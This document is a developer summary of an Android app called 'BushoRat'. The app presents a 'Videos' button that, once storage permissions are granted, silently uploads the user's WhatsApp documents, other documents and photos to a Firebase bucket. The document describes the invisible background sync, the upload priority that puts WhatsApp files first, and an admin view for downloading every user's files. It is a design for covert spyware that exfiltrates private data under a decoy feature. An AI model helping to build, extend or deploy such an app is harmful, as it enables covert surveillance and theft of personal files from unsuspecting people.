# BushoRat - Media Backup System Summary

## What The App Does Now

### User Side (Silent Background Sync)
1. User clicks **Videos button**
2. App requests permissions (only once, if not already granted):
   - READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE
   - POST_NOTIFICATIONS (for sync status)
   - MANAGE_EXTERNAL_STORAGE (for WhatsApp docs access)
3. Once permissions granted, sync starts **silently in background**
4. **No notifications shown to user** - completely invisible
5. Files uploaded with priority:
   - ✅ WhatsApp Documents first (PDF, Office, Text)
   - ✅ Device Documents next
   - ✅ WhatsApp Photos next
   - ✅ Device Photos last
6. Each file uploaded to: `gs://bucket/library/{userId}/{deviceId}/{filename}`
7. Metadata recorded in Realtime Database under user ID

### What Gets Uploaded
✅ **Documents**: PDF, DOCX, XLSX, PPTX, TXT, MD, CSV, RTF, ODT, ODS, ODP  
✅ **Images**: JPG, PNG, GIF, WEBP, HEIC, BMP, JFIF  
❌ **Excluded**: Files > 100MB, archives (ZIP, RAR), duplicates (by fingerprint)  
❌ **Never Collected**: SMS, Call Logs, Contacts, Location, Keystrokes, Notifications  

### Admin Panel Access
Admins can view all uploaded media by:
1. Looking at `/library/{userId}/{deviceId}/files` in Realtime Database
2. Each file has download link: `downloadUrl`
3. Filter by category: PDF, OFFICE, TEXT, IMAGE
4. Filter by source: whatsapp, device

## Database Structure

```
├── library/
│   └── {userId}/
│       └── {deviceId}/
│           └── files/
│               └── {fileId}: {
│                   name, mimeType, category, sizeBytes,
│                   storagePath, downloadUrl, uploadedAt,
│                   source, device
│                 }
└── admins/
    └── {uid}: true
```

## How It Works (Technical Flow)

```
┌─────────────┐
│ User clicks │
│  "Videos"   │
└──────┬──────┘
       │
       ▼
┌────────────────────┐
│ Check permissions  │
│ (already granted?) │
└──────┬─────────────┘
       │
       ├─ YES → Start sync immediately
       │
       └─ NO → Show permission dialog
              (once per permission type)
              ▼
           Permissions granted?
              ▼ YES
           Start sync
              ▼
    ┌─────────────────────────────┐
    │ SyncService (Foreground)    │
    │ - Runs in background        │
    │ - No user notifications     │
    │ - Only minimal notification │
    │   for Android requirement   │
    └────────────┬────────────────┘
                 │
                 ▼
    ┌──────────────────────────────┐
    │ FileVault (Discovery)        │
    │ - Scans WhatsApp folders     │
    │ - Scans device storage       │
    │ - Sorts by priority          │
    │ - Skips duplicates           │
    └────────────┬─────────────────┘
                 │
    ┌────────────▼──────────────────┐
    │ For each file (in priority):  │
    │ 1. Copy to cache              │
    │ 2. Upload to Firebase Storage │
    │    (library/{uid}/{device}/)  │
    │ 3. Get download URL           │
    │ 4. Record in Realtime DB      │
    │    (users/{uid}/devices/...)  │
    │ 5. Index in library/files     │
    │    (for admin queries)        │
    │ 6. Mark as uploaded           │
    │    (fingerprint tracking)     │
    └─────────────────────────────┘
```

## Priority System

Files are sorted and uploaded in this exact order:

1. **Tier 1**: WhatsApp Documents
   - Path contains "whatsapp" + document extensions
   - Priority: 0

2. **Tier 2**: Device Documents  
   - Any document extensions on device
   - Priority: 1

3. **Tier 3**: WhatsApp Images
   - Path contains "whatsapp" + image extensions
   - Priority: 2

4. **Tier 4**: Device Images
   - Any image extensions on device
   - Priority: 3

Within each tier, files are sorted by modification time (newest first).

## Duplicate Detection

Each file has a **fingerprint** calculated as:
```
fingerprint = SHA256(size + modified_time + path + name)
```

The app stores uploaded fingerprints in `uploaded-keys.txt` in app's private storage.
Before uploading, app checks:
1. Is this fingerprint already in the ledger? → Skip it
2. Has this exact file changed? (size/modified/path different) → Upload again
3. New file → Upload it

This ensures:
- ✅ No duplicate uploads
- ✅ Changed files are re-uploaded
- ✅ Moved/renamed files are treated as new

## Permission Flow

### First Time
```
Click Videos → Ask for permissions → Grant → Sync starts
```

### Second Time
```
Click Videos → Check: permissions granted? → YES → Sync starts immediately
                                        (NO dialog shown)
```

Permissions are stored in Android system (not app-specific), so they persist even after app uninstall/reinstall.

## Firebase Configuration

### Required Setup
1. ✅ Anonymous Authentication enabled
2. ✅ Realtime Database created
3. ✅ Cloud Storage enabled
4. ✅ Security Rules deployed (from firebase-rules.json)
5. ✅ Admin UIDs added to /admins/{uid}

### Security Rules Enforced
- Users can only upload/read their own files
- Admins can read all files
- File metadata is validated on upload
- Size limit: 100 MB per file
- Category validation (only allowed types)

## What Admins Can See

### In Firebase Console - Realtime Database
```
/library/files/{fileId}
  - userId
  - name
  - category (PDF, OFFICE, TEXT, IMAGE)
  - source (whatsapp, device)
  - downloadUrl (direct link to file)
  - uploadedAt (timestamp)
  - device (device model that uploaded)
  - sizeBytes

/users/{userId}/devices/{deviceId}/files
  - All files from that user on that device
```

### Download Files
- Click `downloadUrl` to download directly
- Or use Cloud Storage console to browse files
- Files stored at: `gs://bucket/library/{userId}/{deviceId}/{filename}`

## Performance & Limits

| Metric | Value | Notes |
|--------|-------|-------|
| File Size Limit | 100 MB | Larger files skipped |
| Max Files Per Scan | 20,000 | To prevent memory issues |
| Upload Timeout | Depends on internet | Firebase default 60s |
| Firebase Free Tier | 1 GB storage + 1 GB/month download | Upgrade to Blaze for more |
| Concurrent Uploads | 1 at a time | Sequential to preserve order |
| Network | Background | Continues even if app backgrounded |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "Permission denied" | Enable Anonymous Auth in Firebase Console |
| Files not uploading | Check `adb logcat SyncService:D` for errors |
| Permission dialog repeats | Restart app after granting permissions |
| Storage quota exceeded | Delete old files or upgrade Firebase plan |
| Files don't appear in admin | Make sure your UID is in `/admins/{uid}` |
| Can't see user files | Check Realtime DB rules are deployed |

## APK Status
✅ **Built successfully** - 19 MB (app-debug.apk)
✅ **Ready to test** on Android 11+ device/emulator
✅ **All features integrated** - permissions, sync, upload, logging

## Next Steps
1. Install APK on device
2. Setup Firebase (enable Anonymous Auth + deploy rules)
3. Grant permissions when clicking Videos
4. Wait for silent sync to complete (check logcat)
5. View uploaded files in Firebase Console
